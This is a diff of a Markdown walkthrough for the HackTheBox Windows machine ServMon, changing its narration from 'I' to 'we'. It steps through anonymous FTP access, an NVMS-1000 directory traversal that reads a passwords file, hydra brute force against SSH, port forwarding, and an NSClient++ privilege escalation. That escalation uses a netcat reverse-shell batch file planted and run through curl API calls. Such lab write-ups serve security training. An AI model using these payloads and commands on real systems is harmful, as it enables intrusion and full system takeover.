@@ -30,7 +30,7 @@ This is my guide to the HackTheBox Windows machine _ServMon_.
 
 ## User Flag
 
-To start out, I run my `nmap` scan. The results seem to indicate that _ServMon_ is a Windows webserver. 
+To start out, we'll run an `nmap` scan. The results seem to indicate that _ServMon_ is a Windows webserver. 
 
 - __sC__: Enable common scripts
 
@@ -135,13 +135,13 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Wed Jun 24 21:16:32 2020 -- 1 IP address (1 host up) scanned in 141.75 seconds
 ```
 
-Once I receive the results of the first scan, I perform a full one as well. On this box, it yields nothing. 
+Once we receive the results of the first scan, we'll perform a full one as well. On this box, it yields nothing. 
 
-The first things that catches my attention is that `nmap` indicates that anonymous login on FTP port 21 is enabled. This may yield some access to the file system. I attempt the username `anonymous` with no password and connect succesfully!
+The first thing we see is that `nmap` indicates that anonymous login on FTP port 21 is enabled. This may yield some access to the file system. Let's attempt the username `anonymous` with no password. We connect succesfully!
 
 ![](images/ftp-login.png)
 
-Only a few files are present but there is enough here to help enumerate the system a bit more. Within the `users` directory are two directories for users `nadine` and `nathan`. Additionally, each user has a file saved. With the `get` command, I retrieve a copy of each one.
+Only a few files are present but there is enough here to help enumerate the system a bit more. Within the `users` directory are two directories for users `nadine` and `nathan`. Additionally, each user has a file saved. With the `get` command, we retrieve a copy of each one.
 
 ```
 ftp> cd Nadine
@@ -163,60 +163,60 @@ Regards
 Nadine
 ```
 
-It looks like if I can gain access to Nathan's desktop, I will find a file containing passwords. The `Notes to do.txt` also seems to indicate that user `nathan` has not removed the password file as requested. It may still be there. 
+It looks like if we can gain access to Nathan's desktop, we will find a file containing passwords. The `Notes to do.txt` also seems to indicate that user `nathan` has not removed the password file as requested. It may still be there. 
 
-I've exhausted what is available within the FTP file share, so I return to my `nmap` scan results. Next, I navigate to the webpage. 
+Okay, so with that, we've exhausted what is available within the FTP file share, let's return to our `nmap` scan results. Next, we'll navigate to the webpage. 
 
-The box is hosting the service `NVMS-1000`, a management client for survellience devices. I don't have much in the way of credentials, but I try a few basic combinations, to no avail.
+The box is hosting the service `NVMS-1000`, a management client for survellience devices. We don't have much in the way of credentials, but we'll just try a few basic combinations, to no avail.
 
 ![](images/nvms.png)
 
-A quick google search reveals that this service is vulnerable to a [directory traversal attack](https://www.exploit-db.com/exploits/47774). Perfect! I know from earlier that a password file may still reside on Nathan's desktop. 
+A quick google search reveals that this service is vulnerable to a [directory traversal attack](https://www.exploit-db.com/exploits/47774). Perfect! We know from earlier that a password file may still reside on Nathan's desktop. 
 
-For this attack, I'll use `Burp Suite` to build my payload. First, I'll configure burp as my proxy, turn on intercept, and capture the GET request for the NVMS login page, the main page on _ServMon_. Next, I'll right-click and send that request to the repeater. I then change the path in the request to the directory traversal payload, and send it. Success! I now have arbitrary file access. 
+For this attack, we'll use `Burp Suite` to build my payload. First, we'll configure burp as our proxy, turn on intercept, and capture the GET request for the NVMS login page, the main page on _ServMon_. Next, we'll right-click and send that request to the repeater. We then change the path in the request to the directory traversal payload, and send it. Success! We now have arbitrary file access. 
 
-I modify the payload with the specified path of the potential location of the password file. 
+Let's modify the payload with the specified path of the potential location of the password file. 
 
 ```
 /Users/Nathan/Desktop/passwords.txt`
 ```
 
-I receive a respond, with a list of passwords.
+We receive a respond, with a list of passwords.
 
 ![](images/traversal.png)
 
-I noted earlier that port 22 was open as well. I have some usernames and some passwords, I'll attempt connection through SSH first. My lists are pretty short but for good practice, I use `hydra`.
+We noted earlier that port 22 was open as well. We have some usernames and some passwords, so let's attempt connection through SSH first. Our lists are pretty short but for good practice, we'll use `hydra`.
 
 ```
 hydra -l users.txt -P passwords.txt 10.10.10.184 ssh
 ```
 
-One combination connects successfully, and I gain remote access as user `nadine`.
+One combination connects successfully, and we gain remote access as user `nadine`.
 
 ```
 $ ssh nadine@10.10.10.184
 password: L1k3B1gBut7s@W0rk
 ```
 
-I find my first flag on the user's desktop.
+Let's grab the first flag from the user's desktop.
 
 ![](images/user-flag.png)
 
 ## Root Flag
 
-Some quick enumeration as user `nadine` reveals little. Back stepping a bit, the `nmap` scan indicated that port 8443 was also open and running the service `NSClient`. In my browser, I navigate to `https://10.10.10.184:8443/`. 
+Some quick enumeration as user `nadine` reveals little. Back stepping a bit, the `nmap` scan indicated that port 8443 was also open and running the service `NSClient`. In the browser, we'll navigate to `https://10.10.10.184:8443/`. 
 
 ![](images/nsclient.png)
 
-`NSClient` requires just a password so quickly attempt the ones from my previous list, with no luck. I search online to find that NSClient is vulnerable to a [privilege escalation exploit](https://www.exploit-db.com/exploits/46802). 
+`NSClient` requires just a password so we'll quickly attempt the ones from my previous list, but no luck. Searching online we find that NSClient is vulnerable to a [privilege escalation exploit](https://www.exploit-db.com/exploits/46802). 
 
-The exploit states that the first step must be to find the webapp password with the `nsclient.ini` file. I display the contents of the file and find the password. 
+The exploit states that the first step must be to find the webapp password with the `nsclient.ini` file. In our shell session, we can display the contents of the file and find the password. 
 
 ```
-> type "Program Files\NSClient++\nsclient.ini"
+> type "\Program Files\NSClient++\nsclient.ini"
 ```
 
-Additionally, I note that the only authorized host is `127.0.0.1` or `localhost`. 
+Additionally, we'll note that the only authorized host is `127.0.0.1` or `localhost`. 
 
 ```
 ; Undocumented key
@@ -226,26 +226,26 @@ password = ew2x6SsGTxjRwXOT
 allowed hosts = 127.0.0.1
 ```
 
-To bypass this restriction, I'll make a tunnel using SSH and forward the port. [Linuxize](https://linuxize.com/post/how-to-setup-ssh-tunneling/) provides a great write-up on this topic. Reconnecting with the following command should allow us to login in successfully.
+To bypass this restriction, let's make a tunnel using SSH and forward the port. [Linuxize](https://linuxize.com/post/how-to-setup-ssh-tunneling/) provides a great write-up on this topic. Reconnecting with the following command should allow us to login in successfully.
 
 ```
 $ ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184
 ```
 
-Next, I navigate to `https://127.0.0.1:8443/` and attempt to login. Success!
+Next, we'll navigate to `https://127.0.0.1:8443/` and attempt to login. Success!
 
 ![](images/nsclient-main.png)
 
 Unfortunately, the web application was too buggy and difficult to use without frustration, so I dug into the [documentation](https://docs.nsclient.org/api/rest/) for `NSClient` and decided to use `curl` commands to complete the exploit. 
 
-The next step of the exploit requires a simple batch file for a reverse shell. I name mine `evil.bat`.
+The next step of the exploit requires a simple batch file for a reverse shell. Let's name it `evil.bat`.
 
 ```
 @echo off
 c:\temp\nc.exe 10.10.14.2 4444 -e cmd.exe
 ```
 
-Next, I need to get my batch file and `nc.exe` onto _ServMon_. There a few different means to do that, but since I already have an SSH login, I will use SCP, or secure copy.  
+Next, we need to get my batch file and `nc.exe` onto _ServMon_. There a few different means to do that, but since we already have an SSH login, we'll use SCP, or secure copy.  
 
 ```
 $ cp /usr/share/windows-resources/binaries/nc.exe .
@@ -253,29 +253,29 @@ $ scp nc.exe nadine@10.10.10.184:/Temp
 $ scp evil.bat  nadine@10.10.10.184:/Temp
 ```
 
-On my Kali box, I start an `netcat` listener.
+On Kali, we'll start an `netcat` listener.
 
 ```
 $ nc -lvnp 4444
 ```
 
-Using the documentation, I run the following command to [add a script](https://docs.nsclient.org/api/rest/scripts/#add-script) that will call my batch file.
+Using the documentation, we run the following command to [add a script](https://docs.nsclient.org/api/rest/scripts/#add-script) that will call our batch file.
 
 ```
 $ curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/evil.bat --data-binary @evil.bat
 ```
 
-And finally, I will [execute the command](https://docs.nsclient.org/api/rest/queries/#command-execute) to run the script. 
+And finally, we will [execute the command](https://docs.nsclient.org/api/rest/queries/#command-execute) to run the script. 
 
 ```
 $ curl -s -k -u admin https://localhost:8443/api/v1/queries/evil/commands/execute?time=3m
 ```
 
-My listener successfully connects, and I now have system shell.
+Our listener successfully connects, and we now have system shell.
 
 ![](images/root.png)
 
-I capture the final flag on the Administrator's desktop.
+Let's capture the final flag on the Administrator's desktop.
 
 ![](images/root-flag.png)
 
